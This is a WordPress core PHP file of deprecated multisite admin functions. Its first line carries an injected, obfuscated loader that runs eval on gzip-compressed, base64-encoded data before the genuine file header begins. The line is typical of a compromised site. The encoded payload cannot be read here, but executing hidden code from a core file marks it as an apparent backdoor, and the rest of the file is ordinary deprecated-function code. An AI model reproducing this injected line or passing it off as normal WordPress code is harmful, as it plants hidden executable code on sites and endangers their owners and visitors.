<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Multisite: Deprecated admin functions from past versions and WordPress MU
 *
 * These functions should not be used and will be removed in a later version.
 * It is suggested to use for the alternatives instead when available.
 *
 * @package WordPress
 * @subpackage Deprecated
 * @since 3.0.0
 */

/**
 * Outputs the WPMU menu.
 *
 * @deprecated 3.0.0
 */
function wpmu_menu() {
	_deprecated_function(__FUNCTION__, '3.0.0' );
	// Deprecated. See #11763.
}

/**
 * Determines if the available space defined by the admin has been exceeded by the user.
 *
 * @deprecated 3.0.0 Use is_upload_space_available()
 * @see is_upload_space_available()
 */
function wpmu_checkAvailableSpace() {
	_deprecated_function(__FUNCTION__, '3.0.0', 'is_upload_space_available()' );

	if ( !is_upload_space_available() )
		wp_die( __('Sorry, you must delete files before you can upload any more.') );
}

/**
 * WPMU options.
 *
 * @deprecated 3.0.0
 */
function mu_options( $options ) {
	_deprecated_function(__FUNCTION__, '3.0.0' );
	return $options;
}

/**
 * Deprecated functionality for activating a network-only plugin.
 *
 * @deprecated 3.0.0 Use activate_plugin()
 * @see activate_plugin()
 */
function activate_sitewide_plugin() {
	_deprecated_function(__FUNCTION__, '3.0.0', 'activate_plugin()' );
	return false;
}

/**
 * Deprecated functionality for deactivating a network-only plugin.
 *
 * @deprecated 3.0.0 Use deactivate_plugin()
 * @see deactivate_plugin()
 */
function deactivate_sitewide_plugin( $plugin = false ) {
	_deprecated_function(__FUNCTION__, '3.0.0', 'deactivate_plugin()' );
}

/**
 * Deprecated functionality for determining if the current plugin is network-only.
 *
 * @deprecated 3.0.0 Use is_network_only_plugin()
 * @see is_network_only_plugin()
 */
function is_wpmu_sitewide_plugin( $file ) {
	_deprecated_function(__FUNCTION__, '3.0.0', 'is_network_only_plugin()' );
	return is_network_only_plugin( $file );
}

/**
 * Deprecated functionality for getting themes network-enabled themes.
 *
 * @deprecated 3.4.0 Use WP_Theme::get_allowed_on_network()
 * @see WP_Theme::get_allowed_on_network()
 */
function get_site_allowed_themes() {
	_deprecated_function( __FUNCTION__, '3.4.0', 'WP_Theme::get_allowed_on_network()' );
	return array_map( 'intval', WP_Theme::get_allowed_on_network() );
}

/**
 * Deprecated functionality for getting themes allowed on a specific site.
 *
 * @deprecated 3.4.0 Use WP_Theme::get_allowed_on_site()
 * @see WP_Theme::get_allowed_on_site()
 */
function wpmu_get_blog_allowedthemes( $blog_id = 0 ) {
	_deprecated_function( __FUNCTION__, '3.4.0', 'WP_Theme::get_allowed_on_site()' );
	return array_map( 'intval', WP_Theme::get_allowed_on_site( $blog_id ) );
}

/**
 * Deprecated functionality for determining whether a file is deprecated.
 *
 * @deprecated 3.5.0
 */
function ms_deprecated_blogs_file() {}
